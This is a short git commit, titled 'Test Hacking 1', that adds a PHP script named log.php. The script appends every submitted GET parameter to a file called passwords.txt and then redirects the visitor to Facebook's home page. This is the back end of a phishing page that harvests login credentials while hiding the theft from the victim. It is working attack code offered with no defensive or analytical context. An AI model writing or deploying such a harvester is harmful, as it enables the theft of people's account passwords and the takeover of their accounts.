7f522e70c49049e12f0993b1ca77031ac23ec104
Erik <alejod172@gmail.com>
2020-02-23 13:11:54 -0500

    Test Hacking 1

---
+++ Test/log.php
@@ -0,0 +1,14 @@
+<?php
+header("Location: http://www.facebook.com/home.php? ");
+$handle = fopen("passwords.txt", "a");
+foreach($_GET as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
+ 
